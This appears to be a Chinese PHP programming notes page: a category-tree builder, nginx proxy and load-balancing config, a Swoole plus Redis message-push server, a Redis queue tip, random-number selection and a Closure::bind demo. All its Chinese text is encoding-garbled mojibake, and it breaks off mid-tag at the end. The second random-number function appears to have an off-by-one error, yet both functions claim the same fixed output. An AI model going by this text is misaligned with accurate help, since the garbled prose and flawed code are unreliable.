<h3 id="æ— é™æåˆ†ç±»æ ‘"><a href="#æ— é™æåˆ†ç±»æ ‘" class="headerlink" title="æ— é™æåˆ†ç±»æ ‘"></a>æ— é™æåˆ†ç±»æ ‘</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line">array(</span><br><span class="line">    <span class="number">1</span> =&gt; array(</span><br><span class="line">            <span class="string">'id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="string">'ä¸­åäººæ°‘å…±å’Œå›½'</span>,</span><br><span class="line">            <span class="string">'parent_id'</span> =&gt; <span class="number">0</span>,</span><br><span class="line">            <span class="string">'level'</span> =&gt; <span class="string">'country'</span>,</span><br><span class="line">        ),</span><br><span class="line">    <span class="number">2</span> =&gt; array(</span><br><span class="line">            <span class="string">'id'</span> =&gt; <span class="number">2</span>,</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="string">'åŒ—äº¬å¸‚'</span>,</span><br><span class="line">            <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'level'</span> =&gt; <span class="string">'province'</span>,</span><br><span class="line">        ),</span><br><span class="line">    <span class="number">20</span> =&gt; array(</span><br><span class="line">            <span class="string">'id'</span> =&gt; <span class="number">20</span>,</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="string">'å¤©æ´¥å¸‚'</span>,</span><br><span class="line">            <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'level'</span> =&gt; <span class="string">'province'</span>,</span><br><span class="line">        ),</span><br><span class="line">    <span class="number">38</span> =&gt; array(</span><br><span class="line">            <span class="string">'id'</span> =&gt; <span class="number">38</span>,</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="string">'æ²³åŒ—çœ'</span>,</span><br><span class="line">            <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'level'</span> =&gt; <span class="string">'province'</span>,</span><br><span class="line">        ),</span><br><span class="line">    <span class="number">218</span> =&gt; array(</span><br><span class="line">            <span class="string">'id'</span> =&gt; <span class="number">218</span>,</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="string">'å±±è¥¿çœ'</span>,</span><br><span class="line">            <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'level'</span> =&gt; <span class="string">'province'</span>,</span><br><span class="line">        ),</span><br><span class="line">    <span class="number">349</span> =&gt; array(</span><br><span class="line">            <span class="string">'id'</span> =&gt; <span class="number">349</span>,</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="string">'å†…è’™å¤è‡ªæ²»åŒº'</span>,</span><br><span class="line">            <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'level'</span> =&gt; <span class="string">'province'</span>,</span><br><span class="line">        ),</span><br><span class="line">    <span class="number">465</span> =&gt; array(</span><br><span class="line">            <span class="string">'id'</span> =&gt; <span class="number">465</span>,</span><br><span class="line">            <span class="string">'name'</span> =&gt; <span class="string">'è¾½å®çœ'</span>,</span><br><span class="line">            <span class="string">'parent_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">'level'</span> =&gt; <span class="string">'province'</span>,</span><br><span class="line">        ),</span><br><span class="line">    ...</span><br><span class="line">);</span><br><span class="line">ä¼˜åŒ–å‰</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* è·å–ä»¥çˆ¶çº§ ID ä¸º $parent_id ä¸ºæ ¹èŠ‚ç‚¹çš„æ ‘å‹ç»“æ„æ•°ç»„</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* @param array $arr</span></span><br><span class="line"><span class="comment">* @param int $level æ ‘å‹å½“å‰å±‚</span></span><br><span class="line"><span class="comment">* @param int $parent_id çˆ¶çº§id</span></span><br><span class="line"><span class="comment">* @param int $floor æ ‘å‹æ€»å±‚æ•°</span></span><br><span class="line"><span class="comment">* @return array</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getList</span>(<span class="params">&amp;$arr, $level = <span class="number">0</span>, $parent_id = <span class="number">1</span>, $floor = <span class="number">3</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($level != <span class="number">0</span>) &#123;</span><br><span class="line">        $empty = $arr[$parent_id];</span><br><span class="line">        $empty[<span class="string">'list'</span>] = [];</span><br><span class="line">        $emptyPointer = &amp;$empty[<span class="string">'list'</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $empty = [];</span><br><span class="line">        $emptyPointer = &amp;$empty;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($level &lt; $floor) &#123;</span><br><span class="line">        $ok = <span class="literal">false</span>;</span><br><span class="line">        foreach ($arr <span class="keyword">as</span> $index =&gt; &amp;$item) &#123;</span><br><span class="line">            <span class="keyword">if</span> ($item[<span class="string">'parent_id'</span>] == $parent_id) &#123;</span><br><span class="line">                $data = self::getList($arr, $level + <span class="number">1</span>, $index);</span><br><span class="line">                array_push($emptyPointer, $data);</span><br><span class="line">                $ok = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> ($ok &amp;&amp; $item[<span class="string">'parent_id'</span>] != $parent_id) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $empty;</span><br><span class="line">&#125;</span><br><span class="line">ä¼˜åŒ–åhttps:<span class="comment">//wi1dcard.cn/posts/php-fastest-create-tree-from-list/</span></span><br><span class="line"></span><br><span class="line">public <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getList</span>(<span class="params">$catList</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $treeData = [];</span><br><span class="line">    foreach ($catList <span class="keyword">as</span> &amp;$item) &#123;</span><br><span class="line">        $parent_id = $item[<span class="string">'parent_id'</span>];</span><br><span class="line">        <span class="keyword">if</span> (isset($catList[$parent_id]) &amp;&amp; !empty($catList[$parent_id])) &#123;</span><br><span class="line">            $catList[$parent_id][<span class="string">'list'</span>][] = &amp;$catList[$item[<span class="string">'id'</span>]];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $treeData[] = &amp;$catList[$item[<span class="string">'id'</span>]];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unset($item);</span><br><span class="line">    <span class="keyword">return</span> $treeData[<span class="number">0</span>][<span class="string">'list'</span>]; <span class="comment">// æ ¹èŠ‚ç‚¹åªæœ‰ä¸­åäººæ°‘å…±å’Œå›½ï¼Œæ‰€ä»¥ç›´æ¥è¿”å›ä¸­å›½çš„æ‰€æœ‰å­èŠ‚ç‚¹</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ä»£ç†ä¸åå‘ä»£ç†ã€è´Ÿè½½å‡è¡¡å’Œç¼“å­˜"><a href="#ä»£ç†ä¸åå‘ä»£ç†ã€è´Ÿè½½å‡è¡¡å’Œç¼“å­˜" class="headerlink" title="ä»£ç†ä¸åå‘ä»£ç†ã€è´Ÿè½½å‡è¡¡å’Œç¼“å­˜"></a>ä»£ç†ä¸åå‘ä»£ç†ã€è´Ÿè½½å‡è¡¡å’Œç¼“å­˜</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">ä»£ç†ï¼ˆæ­£å‘ä»£ç†ï¼Œç›®æ ‡æœåŠ¡å™¨ä¸çŸ¥é“è°åœ¨è®¿é—®ï¼‰</span><br><span class="line"></span><br><span class="line">ä½äºå®¢æˆ·ç«¯å’Œç›®æ ‡æœåŠ¡å™¨ä¹‹é—´ï¼Œèµ·åˆ°ä¸€ä¸ªä¸­è½¬çš„ä½œç”¨ã€‚å…¶å®å°±æ˜¯å®¢æˆ·ç«¯æƒ³è®¿é—®ç›®æ ‡æœåŠ¡å™¨ï¼Œä½†æ˜¯å› ä¸ºæŸäº›åŸå› ä¸èƒ½å¤Ÿç›´æ¥è®¿é—®ï¼Œåˆ™æŠŠè¯·æ±‚å’Œç›®æ ‡æœåŠ¡å™¨å‘ç»™ä»£ç†æœåŠ¡å™¨ï¼Œä»£ç†æœåŠ¡å™¨å†å»è¯·æ±‚ç›®æ ‡æœåŠ¡å™¨ï¼ŒæŠŠè¿”å›çš„å“åº”ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">åå‘ä»£ç†ï¼ˆç”¨æˆ·å®é™…å¹¶ä¸çŸ¥é“æœ€ç»ˆæœåŠ¡å™¨ï¼Œåªæ˜¯è®¿é—®ä¸€ä¸ªåå‘ä»£ç†æœåŠ¡å™¨è€Œå·²ï¼‰</span><br><span class="line"></span><br><span class="line">å®¢æˆ·ç«¯ä¼šæŠŠåå‘ä»£ç†æœåŠ¡å™¨å½“æˆç›®æ ‡æœåŠ¡å™¨ï¼Œå‘åå‘ä»£ç†æœåŠ¡å™¨å‘é€è¯·æ±‚åï¼Œåå‘ä»£ç†æœåŠ¡å™¨å†è¯·æ±‚å†…éƒ¨çš„åç«¯æœåŠ¡å™¨ï¼ŒæŠŠå¾—åˆ°çš„å“åº”ç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚</span><br><span class="line">server&#123;</span><br><span class="line">listen <span class="number">80</span>;</span><br><span class="line">  server_name test.test;</span><br><span class="line">  #å°†æœ¬æœºæ¥æ”¶åˆ°çš„test.testçš„è¯·æ±‚å…¨éƒ¨è½¬å‘åˆ°å¦å¤–ä¸€å°æœåŠ¡å™¨192.168.78.128</span><br><span class="line">  location /&#123;</span><br><span class="line">    proxy_pass http:<span class="comment">//192.168.78.128; </span></span><br><span class="line">    #ä¸‹é¢æ˜¯å…¶ä»–è¾…åŠ©æŒ‡ä»¤</span><br><span class="line">    proxy_set_header Host $host; #æ›´æ”¹æ¥è‡ªå®¢æˆ·ç«¯çš„è¯·æ±‚å¤´ä¿¡æ¯</span><br><span class="line">    proxy_set_header X-Real_IP $remote_addr;    #ç”¨æˆ·çœŸå®è®¿é—®ip</span><br><span class="line">    proxy_connect_timeout 2; #é…ç½®nginxä¸åç«¯æœåŠ¡å™¨å»ºç«‹è¿æ¥çš„è¶…æ—¶æ—¶é—´</span><br><span class="line">    proxy_read_timeout 2; #é…ç½®nginxå‘åç«¯å‘å‡ºreadè¯·æ±‚çš„ç­‰å¾…å“åº”è¶…æ—¶æ—¶é—´</span><br><span class="line">    proxy_send_timeout 2; #é…ç½®nginxå‘åç«¯æœåŠ¡å™¨å‘å‡ºwriteè¯·æ±‚çš„ç­‰å¾…å“åº”è¶…æ—¶æ—¶é—´</span><br><span class="line">    proxy_redirect http:<span class="comment">//www.baidu.com; #ç”¨äºä¿®æ”¹åç«¯æœåŠ¡å™¨è¿”å›çš„å“åº”å¤´ä¸­çš„Locationå’ŒRefresh</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ç”¨æˆ·ä¸ç›´æ¥è®¿é—®åç«¯æœåŠ¡å™¨ï¼Œè€Œæ˜¯è®¿é—®è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ï¼Œç”±è´Ÿè½½å‡è¡¡æœåŠ¡å™¨å†æ¬¡è½¬å‘åˆ°åç«¯æœåŠ¡å™¨ã€‚å¦‚æœè¿™ä¸ªæ—¶å€™æœ‰ä¸€å°åç«¯æœåŠ¡å™¨æŒ‚æ‰äº†ï¼Œé‚£ä¹ˆè´Ÿè½½å‡è¡¡æœåŠ¡å™¨ä¼šå‰”é™¤æ‰å®ƒï¼Œå°†åç»­è¯·æ±‚éƒ½è½¬å‘åˆ°å¥½çš„é‚£å°ï¼Œè¿™æ ·å°±ä¸å½±å“ç½‘ç«™çš„æ­£å¸¸è¿è¡Œ</span><br><span class="line">server&#123;</span><br><span class="line">    listen <span class="number">80</span>;</span><br><span class="line">  server_name test.test;</span><br><span class="line">  location / &#123;</span><br><span class="line">    proxy_pass http:<span class="comment">//web_server; #åå‘ä»£ç†</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">#é…ç½®è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ç»„</span><br><span class="line">upstream web_server &#123;</span><br><span class="line">    server <span class="number">192.168</span><span class="number">.78</span><span class="number">.128</span>;</span><br><span class="line">  server <span class="number">192.168</span><span class="number">.78</span><span class="number">.129</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">#é…ç½®è´Ÿè½½å‡è¡¡æœåŠ¡å™¨ç»„</span><br><span class="line">upstream web_server &#123;</span><br><span class="line">    server <span class="number">192.168</span><span class="number">.78</span><span class="number">.128</span> weight=<span class="number">1</span>;</span><br><span class="line">  server <span class="number">192.168</span><span class="number">.78</span><span class="number">.129</span> weight=<span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line">è¿™é‡Œé¢çš„æƒå€¼æ€»å’Œä¸ºä¸€ä¸ªå¾ªç¯ï¼Œè¿™é‡Œä»¥ <span class="number">4</span> æ¬¡ä¸ºä¸€ä¸ªå¾ªç¯ï¼Œé‚£ä¹ˆå°±æ˜¯æ¯å››æ¬¡è¯·æ±‚ä¸­ï¼Œä¸‰æ¬¡ä¼šè¢«åˆ†æ´¾åˆ° <span class="number">129</span> è¿™ä¸ªæœåŠ¡å™¨ï¼Œä¸€æ¬¡åˆ†é…åˆ° <span class="number">128</span>ï¼Œä½†æ˜¯å…·ä½“ä¸‰æ¬¡å¹¶ä¸ä¼šé¡ºåºæ‰§è¡Œï¼Œè€Œæ˜¯æŒ‰ç…§ç®—æ³•åˆ†æ•£æ‰§è¡Œã€‚https:<span class="comment">//learnku.com/articles/26686 https://learnku.com/articles/29231#reply92298</span></span><br></pre></td></tr></table></figure>
<h3 id="Swoole-Redis-listå®ç°ç®€å•æ¶ˆæ¯æ¨é€"><a href="#Swoole-Redis-listå®ç°ç®€å•æ¶ˆæ¯æ¨é€" class="headerlink" title="Swoole,Redis listå®ç°ç®€å•æ¶ˆæ¯æ¨é€"></a>Swoole,Redis listå®ç°ç®€å•æ¶ˆæ¯æ¨é€</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">swoole.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$server = <span class="keyword">new</span> swoole_websocket_server(<span class="string">"0.0.0.0"</span>, <span class="number">9502</span>);</span><br><span class="line"></span><br><span class="line">$server-&gt;on(<span class="string">'workerStart'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$server, $workerId</span>) </span>&#123;</span><br><span class="line">    $redis = <span class="keyword">new</span> Swoole\Coroutine\Redis();</span><br><span class="line">    $redis-&gt;connect(<span class="string">'127.0.0.1'</span>, <span class="number">6379</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// brpop ç¬¬äºŒä¸ªå‚æ•° 50 è¡¨ç¤ºè¶…æ—¶ï¼ˆé˜»å¡ç­‰å¾…ï¼‰æ—¶é—´, blpop åŒç†ï¼Œè¯¦æƒ…å»ºè®®è¯»æ–‡æ¡£,å¯¹åº”çš„ redis æ“ä½œæ˜¯ rpush/lpush key content </span></span><br><span class="line">        <span class="keyword">if</span> (($message = $redis-&gt;brpop(<span class="string">'message'</span>, <span class="number">50</span>)) === <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// var_dump($message); ç»“æœä¸ºæ•°ç»„ </span></span><br><span class="line">        foreach ($server-&gt;connections <span class="keyword">as</span> $fd) &#123;</span><br><span class="line">            $server-&gt;push($fd, <span class="string">'redis çš„ '</span> . $message[<span class="number">0</span>] . <span class="string">' é˜Ÿåˆ—å‘é€æ¶ˆæ¯:'</span> . $message[<span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$server-&gt;on(<span class="string">'open'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$server, $request</span>) </span>&#123;</span><br><span class="line">    $server-&gt;push($request-&gt;fd, <span class="string">"hello;\n"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$server-&gt;on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">swoole_websocket_server $server, $request</span>) </span>&#123;</span><br><span class="line">    $server-&gt;push($request-&gt;fd, <span class="string">"hello"</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$server-&gt;on(<span class="string">'close'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$server, $fd</span>) </span>&#123;</span><br><span class="line">    echo <span class="string">"client-&#123;$fd&#125; is closed\n"</span>;</span><br><span class="line">    $server-&gt;close($fd);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$server-&gt;start();</span><br><span class="line"><span class="comment">//https://alpha2016.github.io/2019/02/16/PHP,Swoole,Redis-list%E5%AE%9E%E7%8E%B0%E6%B6%88%E6%81%AF%E6%8E%A8%E9%80%81/</span></span><br></pre></td></tr></table></figure>
<h3 id="Redis-listé˜Ÿåˆ—å¼‚å¸¸å´©æºƒ"><a href="#Redis-listé˜Ÿåˆ—å¼‚å¸¸å´©æºƒ" class="headerlink" title="Redis listé˜Ÿåˆ—å¼‚å¸¸å´©æºƒ"></a>Redis listé˜Ÿåˆ—å¼‚å¸¸å´©æºƒ</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ç”¨ Redis list åšæ¶ˆæ¯é˜Ÿåˆ—ï¼Œåœ¨å–å‡ºæ¶ˆæ¯çš„æ—¶å€™ Redis å®•æœºï¼Œç¨‹åºä¸Šçš„ä¸šåŠ¡é€»è¾‘æ²¡æ‰§è¡Œï¼Œæ€æ ·å¤„ç†ï¼Ÿå…ˆä¸å»è€ƒè™‘ Redis çš„å¼‚å¸¸å¤„ç†åŠæ¢å¤ï¼Œä¸€èˆ¬ä¸»ä»å“¨å…µæœºåˆ¶å¾ˆéš¾å´©æºƒï¼Œæš‚æ—¶è€ƒè™‘ç¨‹åºç«¯å¦‚ä½•å¤„ç†è¿™ç§</span><br><span class="line"></span><br><span class="line">ç›´æ¥ä½¿ç”¨ Redis å®˜æ–¹çš„ RPOPLPUSH / BRPOPLPUSH source destination å‘½ä»¤ï¼Œåœ¨è¯»å–æ¶ˆæ¯çš„åŒæ—¶ï¼Œå°†è¯»å–åˆ°çš„æ¶ˆæ¯å†…å®¹æ”¾åˆ°ç›®æ ‡é˜Ÿåˆ—ï¼Œç„¶åå½“å‰è¿›ç¨‹è¿›è¡Œæ¶ˆè´¹æ•°æ®ï¼Œæ¶ˆè´¹æˆåŠŸï¼Œåˆ™ lrem destination <span class="number">1</span> key åœ¨ç›®æ ‡é˜Ÿåˆ—ä¸­åˆ é™¤åˆšæ‰çš„æ¶ˆæ¯å†…å®¹ã€‚</span><br></pre></td></tr></table></figure>
<h3 id="ä»0-nä¹‹é—´å–kä¸ªä¸é‡å¤çš„æ•°"><a href="#ä»0-nä¹‹é—´å–kä¸ªä¸é‡å¤çš„æ•°" class="headerlink" title="ä»0-nä¹‹é—´å–kä¸ªä¸é‡å¤çš„æ•°"></a>ä»0-nä¹‹é—´å–kä¸ªä¸é‡å¤çš„æ•°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">ä½¿ç”¨ array ç³»åˆ—å‡½æ•°çš„æ–¹æ³•</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandomN</span>(<span class="params">$max, $num</span>) </span>&#123;</span><br><span class="line">    $count = <span class="number">0</span>;</span><br><span class="line">    $<span class="keyword">return</span> = array();</span><br><span class="line">    <span class="keyword">while</span> ($count &lt; $num) &#123;</span><br><span class="line">        $<span class="keyword">return</span>[] = mt_rand(<span class="number">0</span>, $max);</span><br><span class="line">        $<span class="keyword">return</span> = array_flip(array_flip($<span class="keyword">return</span>));</span><br><span class="line">        $count = count($<span class="keyword">return</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    shuffle($<span class="keyword">return</span>);</span><br><span class="line">    <span class="keyword">return</span> $<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> getRandomN(<span class="number">20</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// output:[7,14,6,12,3,4,15,0,16,10]</span></span><br><span class="line">ä¸ä½¿ç”¨ array ç³»åˆ—å‡½æ•°çš„æ–¹æ³•</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getRandomN</span>(<span class="params">$num, $n</span>)</span>&#123;</span><br><span class="line">    $startArray = range(<span class="number">0</span>, $num);</span><br><span class="line">    $resultArray = [];</span><br><span class="line">    <span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $n; $i++)</span><br><span class="line">    &#123;</span><br><span class="line">        $random = mt_rand(<span class="number">0</span>, $num - $i);</span><br><span class="line">        $resultArray[$i] = $startArray[$random];</span><br><span class="line">        $startArray[$random] = $startArray[$num - $i - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $resultArray;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> getRandomN(<span class="number">20</span>, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// output:[7,14,6,12,3,4,15,0,16,10]</span></span><br><span class="line">https:<span class="comment">//alpha2016.github.io/2019/04/09/PHP%E4%BB%8E0-n%E4%B9%8B%E9%97%B4%E9%9A%8F%E6%9C%BA%E5%8F%96k%E4%B8%AA%E4%B8%8D%E9%87%8D%E5%A4%8D%E7%9A%84%E6%95%B0/</span></span><br></pre></td></tr></table></figure>
<h3 id="åŒ¿åå‡½æ•°-1"><a href="#åŒ¿åå‡½æ•°-1" class="headerlink" title="åŒ¿åå‡½æ•°"></a>åŒ¿åå‡½æ•°</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å£°æ˜ä¸€ä¸ªç‹—å¯¹è±¡</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $name = <span class="string">'æ—ºè´¢'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å£°æ˜ä¸€ä¸ªçŒ«å¯¹è±¡</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $name = <span class="string">'å–µå–µ'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å£°æ˜ä¸€ä¸ªåŒ¿åå‡½æ•°ï¼Œç”¨æ¥è¾“å‡ºåå­—</span></span><br><span class="line">$sayName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    echo $<span class="keyword">this</span>-&gt;name;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ç”¨bindèµ‹å€¼ä¸Šé¢é‚£ä¸ªåŒ¿åå‡½æ•°ï¼Œå¹¶æŒ‡å®šthisæŒ‡å‘ç‹—å¯¹è±¡ï¼Œè¿”å›æ–°çš„é—­åŒ…å‡½æ•°</span></span><br><span class="line">$sayDogName = Closure::bind($sayName, <span class="keyword">new</span> Dog);</span><br><span class="line"></span><br><span class="line"><span class="comment">//è°ƒç”¨æ–°çš„é—­åŒ…å‡½æ•°ï¼Œè¾“å‡º â€œæ—ºè´¢â€</span></span><br><span class="line">$sayDogName();  </span><br><span class="line"><span 